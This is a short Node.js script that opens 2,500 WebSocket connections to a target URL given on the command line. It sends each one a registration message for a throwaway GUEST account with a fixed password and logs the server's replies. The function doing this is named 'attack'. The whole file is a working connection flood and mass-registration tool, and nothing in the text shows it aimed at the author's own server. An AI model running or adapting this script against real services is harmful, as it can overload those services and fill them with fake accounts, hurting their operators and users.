
const WebSocket = require("ws")

let target = process.argv[2]
console.log("target set to", target)

for (let i=0; i<2500; i++) {
    if (i % 100 == 0) console.log("spawn 100 sockets")
    attack(i)
}

function attack(no) {
    let socket = new WebSocket(target)

    socket.onopen = function () {
        console.log("socket connected", no)

        socket.send(JSON.stringify({ "type": "register", "username": "GUEST" + no, "password": "foo123" }))
    }

    socket.onmessage = function (e) {
        console.log("RECEIVED MESSAGE", e.data)
    }
}
